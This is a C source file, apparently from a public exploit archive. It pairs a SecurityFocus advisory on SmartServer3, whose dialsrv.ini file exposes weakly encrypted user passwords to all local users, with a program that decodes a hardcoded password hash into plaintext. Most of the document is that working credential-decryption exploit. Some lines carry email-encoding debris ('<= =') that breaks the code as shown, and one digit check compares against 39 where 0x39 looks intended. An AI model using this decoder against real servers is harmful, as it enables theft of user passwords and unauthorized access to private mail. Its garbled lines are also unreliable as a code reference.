/*
source: http://www.securityfocus.com/bid/1962/info

SmartServer3 is an email server designed for small networks.

A design error exists in SmartServer3 which enables an authenticated user to view other users login information and possibly gain access to passwords. SmartServer3 by default intsalls in the C:\ProgramFiles\smartserver3/ directory and includes a configuration file called dialsrv.ini. This file is accessible by all Windows authenticated users and contains detailed user login information including the encrypted password. However SmartServer3 uses a weak encryption scheme which can easily be broken using a third party utility.

Successful exploitation yields unauthorized access to private data.

The following example of user login information found in the dialsrv.ini file is provided by Steven Alexander <steve@cell2000.net>:

[USER1]
realname=Carl Jones
id=Carl
dir=CARL
pw=~:kC@nD3~:
extml=0
alertport=
alert=
UserActive=1
MailLimit=0
MailMAxWarn=0
MailMaxSize=20
*/


#include <stdio.h>

#define DIGIT 0
#define UPPER 1
#define LOWER 2
#define DEFAULT 3

void main() {
unsigned char start_table[4][8] = {
{ 0x30, 0x4a, 0x7b, 0x53, 0x50, 0x7e, 0x54, 0x43 },
{ 0x41, 0x5b, 0x2e, 0x64, 0x61, 0x31, 0x65, 0x54 },
{ 0x60, 0x7a, 0x4d, 0x25, 0x22, 0x50, 0x26, 0x73 },
{ 0x7e, 0x3a, 0x6b, 0x43, 0x40, 0x6e, 0x44, 0x33} };

unsigned char uname = 0x46;  /* Just the first character from DIR= =
entry */
unsigned char hash[8] = { 'E', '1', 'U', '0', 't', 'b', '*', '&' } ;
unsigned char pass[8];
unsigned char i;
unsigned char range;

if(uname >= 0x30 && uname <=39) {
  for(i=0;i<=7;i++) {
    hash[i]+=1; }
  }

for(i=0;i<8;i++) {
  if(hash[i] == start_table[DEFAULT][i]) {
    pass[i] = uname;
    continue; }

  range=LOWER;  /* hash values wrap to  0x21 after 0x7e */
  if(hash[i] >= start_table[DIGIT][i] && hash[i] <= =
(start_table[DIGIT][i] + 0x0a))
    range = DIGIT;
  if(hash[i] >= start_table[UPPER][i] && hash[i] <= =
(start_table[UPPER][i] + 0x1a))
    range=UPPER;
  if(hash[i] >= start_table[LOWER][i] && hash[i] <= =
(start_table[LOWER][i] + 0x1a))
    range=LOWER;

  if(range==DIGIT) {
    if(i==2 || i==5) {
      if(hash[i] < 0x73) {
        hash[i] = hash[i] + 0x5e; } }
  pass[i] = ( hash[i] - start_table[DIGIT][i] ) + 0x30; }

  if(range==UPPER) {
    pass[i] = ( hash[i] - start_table[UPPER][i] ) + 0x41;
  if(pass[i] >= uname)
    pass[i]+=1; }

  if(range==LOWER) {
    if(i==1 || i ==7) {
      if(hash[i] < 0x73) {
        hash[i] = hash[i] + 0x5e; } }
  pass[i] = ( hash[i] - start_table[LOWER][i] ) + 0x61; }

}

printf("The password is:\n\t");
for(i=0;i<8;i++) {
  printf("%c ", pass[i]);
}
printf("\n");

}
